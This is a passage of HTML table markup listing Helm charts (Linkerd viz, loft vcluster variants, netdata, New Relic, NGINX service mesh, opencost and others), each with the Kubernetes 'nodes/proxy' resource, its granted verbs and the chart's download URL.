Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://helm.linkerd.io/edge/linkerd-viz-2026.1.3.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">loft/vcluster:0.32.0-next.0</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, WATCH, LIST</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://charts.loft.sh/charts/vcluster-0.32.0-next.0.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">loft/vcluster-eks:0.19.10</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, WATCH, LIST</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://charts.loft.sh/charts/vcluster-eks-0.19.10.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">loft/vcluster-k0s:0.19.10</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, WATCH, LIST</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://charts.loft.sh/charts/vcluster-k0s-0.19.10.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">loft/vcluster-k8s:0.19.10</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, WATCH, LIST</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://charts.loft.sh/charts/vcluster-k8s-0.19.10.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">loft/vcluster-pro:0.2.1-alpha.0</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, WATCH, LIST</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://charts.loft.sh/charts/vcluster-pro-0.2.1-alpha.0.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">loft/vcluster-pro-eks:0.2.1-alpha.0</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, WATCH, LIST</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://charts.loft.sh/charts/vcluster-pro-eks-0.2.1-alpha.0.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">loft/vcluster-pro-k0s:0.2.1-alpha.0</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, WATCH, LIST</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://charts.loft.sh/charts/vcluster-pro-k0s-0.2.1-alpha.0.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">loft/vcluster-pro-k8s:0.2.1-alpha.0</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, WATCH, LIST</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://charts.loft.sh/charts/vcluster-pro-k8s-0.2.1-alpha.0.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">loft/vcluster-runtime:0.0.1-alpha.2</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://charts.loft.sh/charts/vcluster-runtime-0.0.1-alpha.2.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">loft/virtualcluster:0.0.28</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, WATCH, LIST</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://charts.loft.sh/charts/virtualcluster-0.0.28.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">loft/vnode-runtime:0.2.0</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://charts.loft.sh/charts/vnode-runtime-0.2.0.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">netdata/netdata:3.7.158</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST, WATCH</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://github.com/netdata/helmchart/releases/download/netdata-3.7.158/netdata-3.7.158.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">newrelic/newrelic-infra-operator:0.6.1</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://github.com/newrelic/helm-charts/releases/download/newrelic-infra-operator-0.6.1/newrelic-infra-operator-0.6.1.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">newrelic/newrelic-infrastructure:2.10.1</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://github.com/newrelic/helm-charts/releases/download/newrelic-infrastructure-2.10.1/newrelic-infrastructure-2.10.1.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">newrelic/nr-k8s-otel-collector:0.9.10</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://github.com/newrelic/helm-charts/releases/download/nr-k8s-otel-collector-0.9.10/nr-k8s-otel-collector-0.9.10.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">newrelic/nri-prometheus:1.14.1</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST, WATCH</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://github.com/newrelic/helm-charts/releases/download/nri-prometheus-1.14.1/nri-prometheus-1.14.1.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nginx/nginx-service-mesh:2.0.0</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://helm.nginx.com/stable/nginx-service-mesh-2.0.0.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">node-feature-discovery/node-feature-discovery:0.18.3</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://github.com/kubernetes-sigs/node-feature-discovery/releases/download/v0.18.3/node-feature-discovery-chart-0.18.3.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">opencost/opencost:2.5.5</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST, WATCH</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://github.com/opencost/opencost-helm-chart/releases/download/opencost-2.5.5/opencost-2.5.5.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 